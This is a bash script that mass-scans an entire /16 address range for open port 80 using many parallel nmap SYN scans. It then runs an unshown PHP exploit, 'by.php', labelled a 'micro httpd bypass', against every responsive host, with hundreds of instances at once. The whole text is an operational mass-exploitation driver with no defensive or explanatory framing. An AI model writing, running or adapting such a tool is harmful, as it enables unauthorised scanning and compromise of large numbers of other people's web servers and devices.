echo "nmap scanner start"

if [ $# -ne 1 ]
then
    echo "Error in $0 - invalid argument"
    echo "Syntax: $0 192.168"
    exit
fi

if [ ! -f "by.php" ]
then
    echo "by.php not found - aborting"
    exit
fi

log="$1-nmap-log.txt"

for i in $(seq 0 255)
do
 while [ `ps aux | grep -c "nmap -P0 -sS $1"` -ge 128 ];do
  t=`date '+%a, %d %b %Y %H:%M:%S %z'`;
  echo "wait... $t"
  sleep 5
 done
 if [ `ps aux | grep -c "nmap -P0 -sS $1"` -le 128 ]; then
  echo "try -> $1.$i"
  buf=`nmap -P0 -sS $1.$i.0/21 -p 80 -oG $log --append-output --max-rtt-timeout 300ms --min-rtt-timeout 50ms --initial-rtt-timeout 250ms --max-retries 2 > /dev/null &`
  sleep 3
 fi
done


 while [ `ps aux | grep -c "nmap -P0 -sS $1"` -ge 2 ];do
  t=`date '+%a, %d %b %Y %H:%M:%S %z'`;
  echo "wait... $t"
  sleep 5
done  


echo "Nmap scanner finish"
sleep 3
found=`cat $log | grep open | wc -l`;
echo "found open:$found"

echo "micro httpd bypass start"
for i in `cat $log | tr -d '\r' | grep open | cut -d " " -f 2 | sort | uniq`
do
 while [ `ps aux | grep -c "by.php $1"` -ge 512 ];do
  t=`date '+%a, %d %b %Y %H:%M:%S %z'`;
  echo "wait... $t"
  sleep 5
 done
if [ `ps aux | grep -c "by.php $1"` -le 512 ]; then
 buf=`php by.php $i > /dev/null &`
fi
done
echo "micro httpd bypass finish"
sleep 3